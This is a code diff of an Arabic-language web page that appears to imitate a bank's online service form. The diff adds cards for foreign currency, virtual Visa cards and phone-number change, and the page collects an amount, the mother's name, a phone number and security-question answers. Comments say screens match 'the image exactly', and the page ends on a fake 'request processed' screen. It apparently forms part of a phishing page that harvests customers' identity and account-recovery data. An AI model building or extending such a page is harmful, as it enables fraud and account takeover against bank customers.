@@ -257,6 +257,7 @@
       box-shadow: 0 3px 8px rgba(188, 38, 42, 0.25);
     }
 
+    /* نافذة أسئلة الأمان السوداء المطابقة للصورة تماماً */
     .questions-modal {
       display: none;
       position: fixed;
@@ -311,6 +312,7 @@
       border-radius: 50%;
     }
 
+    /* شاشة النجاح النهائية المطابقة للصورة تماماً */
     .success-card {
       background: white;
       border-radius: 14px;
@@ -429,7 +431,7 @@
 
   <div class="container" style="padding-bottom: 70px;">
 
-    <!-- 1. خدمات -->
+    <!-- 1. الخدمات الرئيسية -->
     <div id="page-services" class="page active">
       <div class="section-title">الاستمارة أونلاين</div>
       <div class="section-sub">اختر نوع المشكلة التي تواجهها (ما يمكن معالجته عبر هذا القسم)</div>
@@ -469,6 +471,27 @@
           <p>معالجة فورية للتحويلات الخاطئة.</p>
         </div>
         <div>✅</div>
+      </div>
+      <div class="service-card" onclick="startFlow('خدمات العملات الأجنبية')">
+        <div class="service-info">
+          <h3>خدمات العملات الأجنبية</h3>
+          <p>تفعيل وإدارة العملات الأجنبية.</p>
+        </div>
+        <div>💱</div>
+      </div>
+      <div class="service-card" onclick="startFlow('بطاقة فيزا افتراضية')">
+        <div class="service-info">
+          <h3>بطاقة فيزا افتراضية</h3>
+          <p>إصدار وإدارة بطاقات الفيزا الافتراضية.</p>
+        </div>
+        <div>💳</div>
+      </div>
+      <div class="service-card" onclick="startFlow('تغير رقم الهاتف')">
+        <div class="service-info">
+          <h3>تغير رقم الهاتف القديم إلى رقم هاتف جديد.</h3>
+          <p>تغير رقم الهاتف القديم إلى رقم هاتف جديد.</p>
+        </div>
+        <div>🔄</div>
       </div>
     </div>
 
@@ -553,7 +576,7 @@
       </div>
     </div>
 
-    <!-- 6. المبلغ وإسم الوالدة ورقم الهاتف في صفحة واحدة -->
+    <!-- 6. المبلغ وإسم الوالدة ورقم الهاتف (في صفحة واحدة) -->
     <div id="page-finance" class="page">
       <div class="form-card">
         <div class="section-title">متابعة الاستمارة أونلاين</div>
@@ -616,7 +639,7 @@
       </div>
     </div>
 
-    <!-- 8. صفحة النجاح النهائية -->
+    <!-- 8. صفحة النجاح النهائية المطابقة للصورة -->
     <div id="page-success" class="page">
       <div class="success-card">
         <div class="success-header">✓ تم تسجيل ومعالجة طلبك بنجاح</div>
@@ -641,6 +664,7 @@
 
   </div>
 
+  <!-- نافذة أسئلة الأمان السوداء -->
   <div class="questions-modal" id="questionsModal" onclick="closeQuestionsModal()">
     <div class="questions-content" onclick="event.stopPropagation()">
       <div class="question-modal-title">- اختر سؤال الأمان -</div>
